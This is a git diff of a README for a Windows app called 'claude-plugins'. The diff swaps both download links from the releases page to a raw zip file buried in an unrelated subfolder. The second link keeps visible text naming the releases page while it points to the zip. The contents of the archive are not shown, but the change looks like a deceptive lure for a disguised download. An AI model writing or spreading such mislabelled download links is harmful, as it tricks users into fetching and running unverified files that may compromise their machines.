@@ -1,6 +1,6 @@
 # 🤖 claude-plugins - Find Claude Plugins Fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/ninnettesudanese653/claude-plugins/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ This README shows you how to get the app on Windows, open it, and start using it
 
 ## 📥 Download
 
-Visit this page to download: [github.com/ninnettesudanese653/claude-plugins/releases](https://github.com/ninnettesudanese653/claude-plugins/releases)
+Visit this page to download: [github.com/ninnettesudanese653/claude-plugins/releases](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
 
 1. Open the release page in your browser.
 2. Find the latest release at the top.
